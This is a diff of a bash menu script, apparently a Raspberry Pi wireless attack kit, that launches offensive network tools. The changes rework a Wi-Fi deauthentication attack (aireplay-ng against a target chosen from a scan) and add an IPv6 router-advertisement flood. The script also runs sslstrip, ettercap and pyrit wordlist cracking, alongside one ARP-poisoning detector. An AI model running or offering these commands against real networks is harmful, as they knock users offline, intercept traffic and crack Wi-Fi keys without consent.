@@ -1,4 +1,6 @@
 #!/bin/bash
+
+#Remeber to cahnge all interfaces to match your own. on the raspberry pi will most likely be wlan0
 clear
 exit=0
 
@@ -25,6 +27,7 @@ TARGETAP=""
 
 Nearby_Mac(){
 	AvailableAP=()
+	TARGETAP="AA:BB:CC:DD:EE:FF"
 	for i in $( iwlist wlan2 scan | grep 'Address' | awk -F' ' '{print $5}' )
 	do
 		AvailableAP[$count]="$i"
@@ -38,7 +41,6 @@ Nearby_Mac(){
 	done
 	TARGETAP=$( whiptail --menu "Select a target host:" 20 80 10 \
 			"${AvailableAP[@]}" 3>&2 2>&1 1>&3- )
-	pkill iwlist
 }
 
 ##Main loop
@@ -63,6 +65,8 @@ while [ exit != 2 ]; do
 		sslstrip "SSLStrip" \
 		ettercap "Open ettercap GUI" 2>CHOICE \
 		deauth "Deauth attack - sends deauth packets to target"\
+		arp-cop "ARP posion detector"\
+		ipv6-flood "Floods IPV6 advertisements slows ipv6 enabled machines"\
 		quit "Quit"
 	
 	#Wait. doesnt whiptail have the case system built-in?
@@ -121,7 +125,7 @@ while [ exit != 2 ]; do
 
 		pyrit -r $PYRITCAP -i $PYRITWORDLIST attack_passthrough
 	;;
-	#My favorite -Jack
+	#Jacks old favorite
 	sslstrip)
 		auto_map
 		
@@ -145,12 +149,19 @@ while [ exit != 2 ]; do
 	#Cha thats cheating! no GUI 4 you!
 	ettercap) ettercap -G
 	;;
-	#Will be my favorite if it will work! gah!
-	deauth)Nearby_Mac
-		airmon-ng start wlan2
-		aireplay-ng -0 0 -a $TARGETAP mon0 --ignore-negative-one
-		wait
+	#New favorite -Jack
+	deauth)airmon-ng start wlan2
+		echo "discovering nearby APs"
+		Nearby_Mac
+		echo "launching attack"
+		aireplay-ng -0 20 -a $TARGETAP mon0 --ignore-negative-one
 		airmon-ng stop mon0
+	;;
+	arp-cop)echo "press 'q' to quit"
+		ettercap -T -i wlan2 -P arp_cop
+	;;
+	#needs a better way to exit may cause end of program
+	ipv6-flood) flood_advertise6 wlan2
 	;;
 	#exits the loop of eternity
 	quit) exit = 1
